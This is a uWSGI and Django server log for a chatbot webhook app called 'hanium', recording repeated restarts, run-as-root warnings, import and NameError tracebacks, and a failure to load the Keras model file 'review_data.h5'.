  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from nlp import naverNlp
ModuleNotFoundError: No module named 'nlp'
[pid: 11031|app: 0|req: 3/3] 192.241.227.83 () {36 vars in 502 bytes} [Mon Aug 24 08:06:15 2020] GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f => generated 130033 bytes in 75 msecs (HTTP/1.1 500) 2 headers in 96 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:09:53 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x557ecb1f1cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x557ecb1f1cf0 pid: 11088 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11088, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 37, in webhook
    return welcome()
  File "./haniumapp/views.py", line 44, in welcome
    text,score = predict_pos_text('3D     ..  3D     ??')
NameError: name 'predict_pos_text' is not defined
[pid: 11088|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:09:59 2020] POST /webhook/ => generated 66513 bytes in 54 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:12:00 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55b8a54c4cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55b8a54c4cf0 pid: 11119 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11119, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 115, in _get_response
    response = self.process_exception_by_middleware(e, request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 113, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File "/usr/local/lib/python3.6/dist-packages/django/views/decorators/csrf.py", line 54, in wrapped_view
    return view_func(*args, **kwargs)
  File "./haniumapp/views.py", line 37, in webhook
    return welcome()
  File "./haniumapp/views.py", line 44, in welcome
    text,score = naverNlp.predict_pos_text('3D     ..  3D     ??')
NameError: name 'naverNlp' is not defined
[pid: 11119|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Mon Aug 24 08:12:06 2020] POST /webhook/ => generated 66499 bytes in 53 msecs (HTTP/1.1 500) 5 headers in 156 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:14:35 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x55f467c11cf0
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x55f467c11cf0 pid: 11152 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11152, cores: 1)
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 10, in <module>
    from . import naverNlp
ImportError: cannot import name 'naverNlp'
[pid: 11152|app: 0|req: 1/1] 66.102.6.205 () {42 vars in 540 bytes} [Mon Aug 24 08:14:39 2020] POST /webhook/ => generated 114319 bytes in 76 msecs (HTTP/1.1 500) 5 headers in 157 bytes (1 switches on core 0)
*** Starting uWSGI 2.0.18 (64bit) on [Mon Aug 24 08:17:40 2020] ***
compiled with version: 7.5.0 on 07 June 2020 09:24:01
os: Linux-5.3.0-1032-aws #34~18.04.2-Ubuntu SMP Fri Jul 24 10:06:28 UTC 2020
nodename: ip-172-31-43-194
machine: x86_64
clock source: unix
detected number of CPU cores: 8
current working directory: /home/hanium
detected binary path: /usr/local/bin/uwsgi
!!! no internal routing support, rebuild with pcre support !!!
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** WARNING: you are running uWSGI without its master process manager ***
your processes number limit is 254668
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address :8001 fd 3
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
Python version: 3.6.9 (default, Jul 17 2020, 12:50:27)  [GCC 8.4.0]
*** Python threads support is disabled. You can enable it with --enable-threads ***
Python main interpreter initialized at 0x559eca362d00
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 72920 bytes (71 KB) for 1 cores
*** Operational MODE: single process ***
WSGI app 0 (mountpoint='') ready in 0 seconds on interpreter 0x559eca362d00 pid: 11194 (default app)
uWSGI running as root, you can use --uid/--gid/--chroot options
*** WARNING: you are running uWSGI as root !!! (use the --uid flag) *** 
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI worker 1 (and the only) (pid: 11194, cores: 1)
2020-08-24 08:17:45.627273: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcudart.so.10.1'; dlerror: libcudart.so.10.1: cannot open shared object file: No such file or directory
2020-08-24 08:17:45.627309: I tensorflow/stream_executor/cuda/cudart_stub.cc:29] Ignore above cudart dlerror if you do not have a GPU set up on your machine.
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:18:08.352922: W tensorflow/stream_executor/platform/default/dso_loader.cc:59] Could not load dynamic library 'libcuda.so.1'; dlerror: libcuda.so.1: cannot open shared object file: No such file or directory
2020-08-24 08:18:08.352953: W tensorflow/stream_executor/cuda/cuda_driver.cc:312] failed call to cuInit: UNKNOWN ERROR (303)
2020-08-24 08:18:08.352969: I tensorflow/stream_executor/cuda/cuda_diagnostics.cc:156] kernel driver does not appear to be running on this host (ip-172-31-43-194): /proc/driver/nvidia/version does not exist
2020-08-24 08:18:08.353190: I tensorflow/core/platform/cpu_feature_guard.cc:142] This TensorFlow binary is optimized with oneAPI Deep Neural Network Library (oneDNN) to use the following CPU instructions in performance-critical operations:  AVX2 FMA
To enable them in other operations, rebuild TensorFlow with the appropriate compiler flags.
2020-08-24 08:18:08.379863: I tensorflow/core/platform/profile_utils/cpu_utils.cc:104] CPU Frequency: 2199825000 Hz
2020-08-24 08:18:08.380273: I tensorflow/compiler/xla/service/service.cc:168] XLA service 0x559ecdd8c6d0 initialized for platform Host (this does not guarantee that XLA will be used). Devices:
2020-08-24 08:18:08.380290: I tensorflow/compiler/xla/service/service.cc:176]   StreamExecutor device (0): Host, Default Version
2020-08-24 08:18:08.682065: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:18:08.683490: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:18:08.684981: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:18:11 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.201) !!!
Mon Aug 24 08:18:11 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.201)
OSError: write error
[pid: 11194|app: 0|req: 1/1] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:17:45 2020] POST /webhook/ => generated 32611 bytes in 26749 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:18:55.401084: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:18:55.402500: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:18:55.403934: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:18:58 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:18:58 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 2/2] 223.194.169.151 () {52 vars in 923 bytes} [Mon Aug 24 08:18:34 2020] GET / => generated 32611 bytes in 24364 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:19:17.966441: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:19:17.967885: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:19:17.969242: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:19:21 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request / (ip 223.194.169.151) !!!
Mon Aug 24 08:19:21 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during GET / (223.194.169.151)
OSError: write error
[pid: 11194|app: 0|req: 3/3] 223.194.169.151 () {50 vars in 873 bytes} [Mon Aug 24 08:18:58 2020] GET / => generated 32611 bytes in 22576 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:19:40.896283: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:19:40.897714: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:19:40.899078: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /webhook/
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 581, in urlconf_module
    return import_module(self.urlconf_name)
  File "/usr/lib/python3.6/importlib/__init__.py", line 126, in import_module
    return _bootstrap._gcd_import(name[level:], package, level)
  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
  File "./hanium/urls.py", line 18, in <module>
    import haniumapp.views
  File "./haniumapp/views.py", line 7, in <module>
    from . import naverNlp
  File "./haniumapp/naverNlp.py", line 94, in <module>
    loaded_model = load_model('review_data.h5') #      
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/keras/saving/save.py", line 189, in load_model
    loader_impl.parse_saved_model(filepath)
  File "/usr/local/lib/python3.6/dist-packages/tensorflow/python/saved_model/loader_impl.py", line 114, in parse_saved_model
    constants.SAVED_MODEL_FILENAME_PB))
OSError: SavedModel file does not exist at: review_data.h5/{saved_model.pbtxt|saved_model.pb}
Mon Aug 24 08:19:44 2020 - SIGPIPE: writing to a closed pipe/socket/fd (probably the client disconnected) on request /webhook/ (ip 66.102.6.201) !!!
Mon Aug 24 08:19:44 2020 - uwsgi_response_write_body_do(): Broken pipe [core/writer.c line 341] during POST /webhook/ (66.102.6.201)
OSError: write error
[pid: 11194|app: 0|req: 4/4] 66.102.6.201 () {42 vars in 540 bytes} [Mon Aug 24 08:19:21 2020] POST /webhook/ => generated 32611 bytes in 22935 msecs (HTTP/1.1 500) 5 headers in 157 bytes (0 switches on core 0)
0 / 50000
10000 / 50000
20000 / 50000
30000 / 50000
40000 / 50000
2020-08-24 08:20:25.626665: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_2_grad/concat/split_2/split_dim' with dtype int32
	 [[{{node gradients/split_2_grad/concat/split_2/split_dim}}]]
2020-08-24 08:20:25.628107: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_grad/concat/split/split_dim' with dtype int32
	 [[{{node gradients/split_grad/concat/split/split_dim}}]]
2020-08-24 08:20:25.629473: W tensorflow/core/common_runtime/executor.cc:1086] [/device:CPU:0] Executor start aborting: Invalid argument: You must feed a value for placeholder tensor 'gradients/split_1_grad/concat/split_1/split_dim' with dtype int32
	 [[{{node gradients/split_1_grad/concat/split_1/split_dim}}]]
Internal Server Error: /
Traceback (most recent call last):
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/exception.py", line 34, in inner
    response = get_response(request)
  File "/usr/local/lib/python3.6/dist-packages/django/core/handlers/base.py", line 100, in _get_response
    resolver_match = resolver.resolve(request.path_info)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 544, in resolve
    for pattern in self.url_patterns:
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
  File "/usr/local/lib/python3.6/dist-packages/django/urls/resolvers.py", line 588, in url_patterns
    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
  File "/usr/local/lib/python3.6/dist-packages/django/utils/functional.py", line 48, in __get__
    res = instance.__dict__[self.name] = self.func(instance)
